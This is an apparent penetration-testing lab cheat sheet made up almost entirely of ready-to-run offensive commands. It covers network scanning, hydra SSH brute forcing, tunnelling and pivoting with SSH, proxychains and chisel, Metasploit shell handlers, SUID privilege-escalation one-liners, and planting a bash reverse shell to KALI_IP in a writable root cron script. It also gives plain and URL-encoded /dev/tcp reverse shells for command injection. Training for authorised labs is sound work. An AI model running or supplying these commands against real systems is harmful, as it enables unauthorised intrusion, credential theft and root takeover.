# Lab Quick Reference Cheat Sheet

## Reconnaissance

```bash
nmap -sn 192.168.244.0/24                        # Host discovery
nmap -sV -sC TARGET -oN scan.txt                  # Service scan + default scripts
nmap -sT -Pn -sV TARGET                           # TCP connect scan (works through proxychains)
nmap -p- TARGET                                    # All 65535 ports
nc -vn TARGET 22                                   # Banner grab SSH
nc -vn TARGET 80                                   # Banner grab HTTP
nc -zvn TARGET 20-100                              # Quick port sweep
curl -s TARGET | grep "<!--"                       # Check HTML comments
dirb http://TARGET                                 # Directory brute force
ftp TARGET                                         # Check anonymous FTP (user: anonymous)
```

## Credential Attacks

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4 -f
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -f
```

## SSH Tunnels

```bash
# Local port forward — reach one service
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@pivot

# Local multi-port forward — reach several services
ssh -L 2222:target:22 -L 8080:target:80 user@pivot

# Dynamic forward — SOCKS proxy for broad access
ssh -D 9050 user@pivot

# Dynamic with jump — SOCKS through multiple hops
ssh -D 9050 -J user@hop1 user@hop2

# Reverse forward — target connects back to you
ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@your_machine

# Background tunnel (no shell)
ssh -fN -L 8080:target:80 user@pivot
ssh -fN -D 9050 user@pivot

# Kill background tunnels
ps aux | grep ssh
kill PID
```

## proxychains

```bash
# Config: /etc/proxychains4.conf
# Last line: socks5 127.0.0.1 9050

proxychains nmap -sT -Pn TARGET
proxychains curl http://TARGET
proxychains nc -vn TARGET 22
proxychains ssh user@TARGET
```

## Chisel (when SSH tunnels are blocked)

```bash
# On Kali (server)
chisel server --reverse --port 8888

# On target (client)
chisel client KALI_IP:8888 R:socks

# Creates SOCKS proxy on Kali port 1080
# Update proxychains: socks5 127.0.0.1 1080
```

## iptables

```bash
# View rules
sudo iptables -L -n -v --line-numbers
sudo iptables -t nat -L -n -v

# Flush and reset
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

# Block all except SSH
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP

# NAT port forward
sudo iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination TARGET:22
sudo iptables -A FORWARD -p tcp -d TARGET --dport 22 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Logging
sudo iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 4
grep "DROPPED" /var/log/syslog          # Debian/Ubuntu
grep "DROPPED" /var/log/messages        # CentOS

# Save rules
sudo netfilter-persistent save          # Debian/Ubuntu
sudo service iptables save              # CentOS
```

## Routing

```bash
ip route                                           # View routes
ip route get TARGET_IP                             # Which route handles this?
sudo ip route add 172.16.0.0/24 via GATEWAY_IP     # Add route to subnet
sudo ip route del 172.16.0.0/24 via GATEWAY_IP     # Delete route
```

## Metasploit

```bash
sudo systemctl start postgresql
msfconsole

# Search
search type:auxiliary path:scanner/ssh
search type:exploit platform:windows smb
search cve:2021-44228

# Use a module
use auxiliary/scanner/ssh/ssh_login
show options
set RHOSTS 127.0.0.1
set RPORT 2222
set USERNAME user
set PASSWORD pass
run

# Through proxychains/tunnels
set Proxies socks5:127.0.0.1:1080

# Handler for catching shells
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST KALI_IP
set LPORT 5555
run -j

# Session management
sessions                # List sessions
sessions -i 1           # Interact with session 1
background              # Background current session
hosts                   # Show discovered hosts
services                # Show discovered services
creds                   # Show harvested credentials
```

## Privilege Escalation

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common SUID exploits (check GTFOBins)
/usr/local/bin/find . -exec /bin/bash -p \;                                    # SUID find
/usr/local/bin/python3_debug -c 'import os; os.setuid(0); os.system("/bin/bash")'  # SUID python
/usr/local/bin/bash_debug -p                                                   # SUID bash
/usr/local/bin/vim.escalate /root/flag.txt                                     # SUID vim (read files)

# Writable cron (check for world-writable scripts running as root)
ls -la /opt/scripts/
cat /etc/cron.d/*
echo "bash -i >& /dev/tcp/KALI_IP/6666 0>&1" >> /opt/scripts/writable_script.sh
# Catch on Kali: nc -lvnp 6666

# Check sudo
sudo -l
```

## Reverse Shells

```bash
# Bash reverse shell
bash -i >& /dev/tcp/KALI_IP/PORT 0>&1

# URL-encoded (for command injection)
bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/PORT%200>%261'

# Catch with nc
nc -lvnp PORT

# Catch with Metasploit
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST KALI_IP
set LPORT PORT
run

# Upgrade dumb shell to interactive
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Post-Exploitation Enumeration

```bash
whoami && id                             # Who am I?
sudo -l                                  # What can I sudo?
cat /etc/passwd                          # All users
ip a                                     # Network interfaces
ip route                                 # Routing table
ss -tlnp                                 # Listening ports
ps aux                                   # Running processes
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
cat /etc/crontab                         # Scheduled tasks
ls -la /etc/cron*                        # Cron directories
find / -writable -type f 2>/dev/null     # Writable files
cat ~/.bash_history                      # Command history
ls -la /home/*/                          # Other users' homes
```

## Lab Reset Template

```bash
# Run on each VM to reset
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

# Delete lab users (adjust names per lab)
sudo userdel -r USERNAME 2>/dev/null

# Verify
sudo iptables -L -n
cat /etc/passwd | grep -E "user1|user2|user3"
```
